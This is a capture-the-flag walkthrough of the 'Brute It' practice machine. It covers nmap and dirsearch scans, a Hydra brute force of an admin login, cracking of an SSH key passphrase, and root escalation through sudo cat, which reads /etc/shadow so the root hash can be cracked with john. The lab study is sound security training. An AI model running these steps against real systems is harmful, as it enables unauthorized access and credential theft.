# Brute It

start with nmap scan 
```bash
 # sudo nmap -A -T4 10.10.155.182 

22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
│| ssh-hostkey: 
│|   2048 4b:0e:bf:14:fa:54:b3:5c:44:15:ed:b2:5d:a0:ac:8f (RSA)
│|   256 d0:3a:81:55:13:5e:87:0c:e8:52:1e:cf:44:e0:3a:54 (ECDSA)
│|_  256 da:ce:79:e0:45:eb:17:25:ef:62:ac:98:f0:cf:bb:04 (ED25519)

│80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
│|_http-title: Apache2 Ubuntu Default Page: It works
│|_http-server-header: Apache/2.4.29 (Ubuntu)


```


we found that it is default apache server 
![apache](https://user-images.githubusercontent.com/63524369/152644692-4e8febcc-29e8-4c10-961f-128ec55275a3.png)


!run Dirsearch on it 

```bash 
# dirsearch -u http://10.10.155.182                                       ✔ 
 

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927

Output File: /root/.dirsearch/reports/10.10.155.182/_22-02-05_07-36-05.txt

Error Log: /root/.dirsearch/logs/errors-22-02-05_07-36-05.log

Target: http://10.10.155.182/

[07:36:05] Starting: 
[07:36:15] 403 -  278B  - /.ht_wsr.txt
[07:36:15] 403 -  278B  - /.htaccess.orig
[07:36:15] 403 -  278B  - /.htaccess.bak1
[07:36:15] 403 -  278B  - /.htaccess.sample
[07:36:15] 403 -  278B  - /.htaccess_orig
[07:36:15] 403 -  278B  - /.htaccess.save
[07:36:15] 403 -  278B  - /.htaccess_sc
[07:36:15] 403 -  278B  - /.htaccess_extra
[07:36:16] 403 -  278B  - /.htaccessOLD
[07:36:16] 403 -  278B  - /.htaccessOLD2
[07:36:16] 403 -  278B  - /.htm
[07:36:16] 403 -  278B  - /.htaccessBAK
[07:36:16] 403 -  278B  - /.html
[07:36:16] 403 -  278B  - /.htpasswds
[07:36:16] 403 -  278B  - /.httr-oauth
[07:36:16] 403 -  278B  - /.htpasswd_test
[07:36:17] 403 -  278B  - /.php
[07:36:38] 301 -  314B  - /admin  ->  http://10.10.155.182/admin/
[07:36:39] 200 -  671B  - /admin/
[07:36:39] 200 -  671B  - /admin/?/login
[07:36:40] 403 -  278B  - /admin/.htaccess
[07:36:40] 200 -  671B  - /admin/index.php
[07:37:12] 200 -   11KB - /index.html
[07:37:34] 403 -  278B  - /server-status/
[07:37:34] 403 -  278B  - /server-status

Task Completed


```

go to ``/admin`` found that it is login page 

![admin](https://user-images.githubusercontent.com/63524369/152644712-e94dc9a8-a340-42b7-a9ce-fdf002441226.png)



brute force the login page with hydra 

```bash 

# hydra -l admin -P ~/Documents/rockyou.txt  10.10.155.182  http-post-form  "/admin:user=^USER^&pass=^PASS^:Username or password invalid:H=Cookie: security=low; PHPSESSID=vosjjgc9n7s1ckho0vq3r0js4a" 
[admin:xa%%%%]
```
we found RSA key --> ssh2john it 
```bash
# john hash.txt -wordlist=~/Documents/rockyou.txt  

ro%%%%%%       (id_rsa)

```
now lets connect to ssh with the key 
```bash

# chmod 600 id_rsa
# ssh john@10.10.155.182 -i id_rsa 

```
connect to ssh 
```bash
john@bruteit:~$ ls 
user.txt 

john@bruteit:~$ cat user.txt


```

Privesc 
```bash
john@bruteit:~$ ls -la
total 40
drwxr-xr-x 5 john john 4096 Sep 30  2020 .
drwxr-xr-x 4 root root 4096 Aug 28  2020 ..
-rw------- 1 john john  394 Sep 30  2020 .bash_history
-rw-r--r-- 1 john john  220 Aug 16  2020 .bash_logout
-rw-r--r-- 1 john john 3771 Aug 16  2020 .bashrc
drwx------ 2 john john 4096 Aug 16  2020 .cache
drwx------ 3 john john 4096 Aug 16  2020 .gnupg
-rw-r--r-- 1 john john  807 Aug 16  2020 .profile
drwx------ 2 john john 4096 Aug 16  2020 .ssh
-rw-r--r-- 1 john john    0 Aug 16  2020 .sudo_as_admin_successful
-rw-r--r-- 1 root root   33 Aug 16  2020 user.txt



```

If ``.sudo_as_admin_successful``  found in the user home dir that mean that user can or run programs or service as root before
so we can check by running 
```bash
sudo -l 

Matching Defaults entries for john on bruteit:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User john may run the following commands on bruteit:
    (root) NOPASSWD: /bin/cat

```

use gtfobins to search for ```/bin/cat ```

we found sudo option 

```bash 

# sudo cat "$LFILE"
# sudo  cat /root/root.txt

```

now to find the password for the root user or any user in the machine
```bash 

# sudo cat /etc/shadow 
# sudo cat /etc/passwd

1. copy them to your machine 
2. unshadow passwd.txt shadow.txt > password.txt  
3. john password.txt -wordlist=rockyou.txt

{fo%%%%%%       (root)}
```




Flags 

```
UserFlag : THM{brut3%%%%%%%}
RootFlag : THM{pr1v%%%%%%%%}
```

